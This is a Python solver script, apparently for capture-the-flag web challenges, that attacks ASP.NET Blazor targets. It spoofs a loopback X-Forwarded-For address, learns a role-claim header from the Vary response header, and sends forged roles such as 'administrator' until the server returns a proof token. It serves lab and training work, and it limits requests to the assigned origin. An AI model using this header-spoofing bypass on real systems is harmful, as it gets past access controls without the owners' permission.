#!/usr/bin/env python3
"""Solve assigned ASP.NET Blazor targets that trust forwarded topology and role claims."""

from __future__ import annotations

import argparse
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
import sys
from threading import Lock
from time import perf_counter
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlsplit
from urllib.request import HTTPRedirectHandler, Request, build_opener

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
USER_AGENT = "HuntressCTF-Web-Solver/1.0"
PROOF_RE = re.compile(rb"\bproof_[A-Za-z0-9_-]{12,}\b")


class NoRedirects(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):  # type: ignore[no-untyped-def]
        return None


class Solver:
    def __init__(self, target: str, output_dir: Path, clues: dict | None = None):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.opener = build_opener(NoRedirects)
        self.responses: list[dict[str, object]] = []
        self._response_lock = Lock()
        self.initial_clues = clues

    def get(
        self, route: str, *, headers: dict[str, str] | None = None
    ) -> tuple[int, dict[str, str], bytes]:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-target route: {route}")
        request_headers = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/html;q=0.8, */*;q=0.5",
        }
        if headers:
            request_headers.update(headers)
        request = Request(url, headers=request_headers, method="GET")
        started = perf_counter()
        try:
            response = self.opener.open(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed for {route}: {exc.reason}") from exc
        body = response.read(MAX_BODY_BYTES + 1)
        elapsed_ms = round((perf_counter() - started) * 1000, 1)
        if len(body) > MAX_BODY_BYTES:
            raise RuntimeError(f"{route} exceeded the 2 MiB response limit")
        response_headers = {key.lower(): value for key, value in response.headers.items()}
        with self._response_lock:
            filename = (
                f"{len(self.responses) + 1:02d}-"
                f"{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
            )
            (self.output_dir / filename).write_bytes(body)
            self.responses.append(
                {
                    "file": filename,
                    "url": url,
                    "method": "GET",
                    "status": int(getattr(response, "status", response.code)),
                    "bytes": len(body),
                    "sha256": hashlib.sha256(body).hexdigest(),
                    "elapsed_ms": elapsed_ms,
                    "response_headers": response_headers,
                }
            )
        return int(getattr(response, "status", response.code)), response_headers, body

    def json(self, route: str, description: str) -> dict:
        status, _, body = self.get(route)
        try:
            value = json.loads(body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise RuntimeError(f"{description} returned invalid JSON (HTTP {status})") from exc
        if status != 200 or not isinstance(value, dict):
            raise RuntimeError(f"{description} returned HTTP {status}: {value}")
        return value

    @staticmethod
    def role_candidates(page: str, policy: str | None) -> list[str]:
        candidates: list[str] = []
        lowered = page.lower()
        if "administrative actions" in lowered or "administrator" in lowered:
            candidates.append("administrator")
        if policy and policy.endswith("_only"):
            candidates.append(policy[: -len("_only")])
        return list(dict.fromkeys(candidates))

    def solve(self) -> tuple[str, dict]:
        clues = (
            self.initial_clues
            if self.initial_clues is not None
            else self.json("/api/clues", "/api/clues")
        )
        feature = clues.get("feature_route")
        component = clues.get("component_route")
        if not isinstance(feature, str) or not feature:
            raise ValueError("route inventory does not disclose feature_route")
        if not isinstance(component, str) or not component:
            raise ValueError("route inventory does not disclose component_route")

        # Root copy, feature baseline, and component markup are independent.
        # Fetch them together; most targets yield enough role evidence from
        # the root and feature, so the component can remain a fallback.
        with ThreadPoolExecutor(max_workers=2) as pool:
            root_future = pool.submit(self.get, "/")
            feature_future = pool.submit(self.get, feature)
            root_status, _, root_body = root_future.result()
            feature_status, feature_headers, feature_body = feature_future.result()
        if root_status != 200:
            raise RuntimeError(f"target root returned HTTP {root_status}")
        page_text = root_body.decode("utf-8", "replace")
        if feature_status not in (401, 403):
            match = PROOF_RE.search(feature_body)
            if match:
                proof = match.group().decode("ascii")
                return proof, {
                    "clues": clues,
                    "root_route": "/",
                    "component_route": component,
                    "feature_route": feature,
                    "proof": proof,
                }
        policy: str | None = None
        try:
            baseline = json.loads(feature_body.decode("utf-8"))
            if isinstance(baseline, dict) and isinstance(baseline.get("policy"), str):
                policy = baseline["policy"]
        except (UnicodeDecodeError, json.JSONDecodeError):
            baseline = None

        varied_headers = [
            header.strip().lower()
            for header in feature_headers.get("vary", "").split(",")
            if header.strip().lower().startswith("x-arena-")
        ]
        if not varied_headers:
            # Some targets evaluate the forwarded client address before the
            # staff role. The first response then varies on X-Forwarded-For;
            # supplying the loopback address exposes the role-claim header.
            topology_status, topology_headers, topology_body = self.get(
                feature, headers={"X-Forwarded-For": "127.0.0.1"}
            )
            try:
                topology_response = json.loads(topology_body.decode("utf-8"))
            except (UnicodeDecodeError, json.JSONDecodeError):
                topology_response = None
            if isinstance(topology_response, dict):
                topology_policy = topology_response.get("policy")
                if isinstance(topology_policy, str):
                    policy = topology_policy
                baseline = topology_response
            varied_headers = [
                header.strip().lower()
                for header in topology_headers.get("vary", "").split(",")
                if header.strip().lower().startswith("x-arena-")
            ]
            if not varied_headers:
                raise RuntimeError(
                    "feature response did not disclose a role-claim header in Vary "
                    f"after forwarded-address preflight: HTTP {topology_status}, "
                    f"{topology_headers.get('vary')!r}"
                )
        role_header = varied_headers[0]
        attempts: list[dict[str, object]] = []
        tried_roles: set[str] = set()

        def try_roles(roles: list[str]) -> tuple[str, str] | None:
            for role in roles:
                if role in tried_roles:
                    continue
                tried_roles.add(role)
                status, _, body = self.get(
                    feature,
                    headers={
                        "X-Forwarded-For": "127.0.0.1",
                        role_header: role,
                    },
                )
                attempt: dict[str, object] = {
                    "role_claim": role,
                    "status": status,
                    "body_sha256": hashlib.sha256(body).hexdigest(),
                }
                try:
                    response = json.loads(body.decode("utf-8"))
                except (UnicodeDecodeError, json.JSONDecodeError):
                    response = None
                if isinstance(response, dict):
                    attempt["response"] = response
                    proof = response.get("evidence")
                else:
                    proof = None
                if not isinstance(proof, str):
                    match = PROOF_RE.search(body)
                    proof = match.group().decode("ascii") if match else None
                attempts.append(attempt)
                if status == 200 and isinstance(proof, str):
                    return role, proof
            return None

        role_candidates = self.role_candidates(page_text, policy)
        solved = try_roles(role_candidates)
        component_fetched = False
        if solved is None:
            # The prerendered component can carry extra wording on variants
            # whose root and feature policy did not identify a role value.
            page_status, _, page_body = self.get(component)
            component_fetched = True
            if page_status != 200:
                raise RuntimeError(
                    f"component route returned HTTP {page_status}: "
                    f"{page_body[:500].decode('utf-8', 'replace')}"
                )
            page_text += "\n" + page_body.decode("utf-8", "replace")
            solved = try_roles(self.role_candidates(page_text, policy))
        if solved is not None:
            role, proof = solved
            return proof, {
                "clues": clues,
                "root_route": "/",
                "component_route": component,
                "component_fetched": component_fetched,
                "feature_route": feature,
                "role_header": role_header,
                "role_claim": role,
                "baseline_response": baseline,
                "attempts": attempts,
                "proof": proof,
            }
        raise RuntimeError(f"feature did not return a proof after bounded role claims: {attempts}")

    def save_report(self, proof: str, details: dict) -> Path:
        report = {
            "target": self.target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            **details,
            "proof": proof,
            "responses": self.responses,
            "request_policy": {
                "same_origin_only": True,
                "max_response_bytes": MAX_BODY_BYTES,
                "role_header_source": "feature response Vary header",
                "role_claim_source": "assigned page and feature policy",
            },
        }
        path = self.output_dir / "report.json"
        path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        return path


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", help="exact target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path)
    parser.add_argument(
        "--clues-json",
        help="reuse the clue response already fetched by the dispatcher",
    )
    args = parser.parse_args()
    try:
        target = normalize_url(args.target)
        hostname = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{hostname}-framework-roulette-{timestamp}"
        )
        clues = json.loads(args.clues_json) if args.clues_json else None
        if clues is not None and not isinstance(clues, dict):
            raise ValueError("--clues-json must contain a JSON object")
        solver = Solver(target, output_dir, clues)
        proof, details = solver.solve()
        report = solver.save_report(proof, details)
        print(json.dumps({"proof": proof, "report": str(report)}, indent=2))
        return 0
    except (OSError, RuntimeError, ValueError) as exc:
        print(json.dumps({"error": str(exc)}))
        return 1


if __name__ == "__main__":
    sys.exit(main())
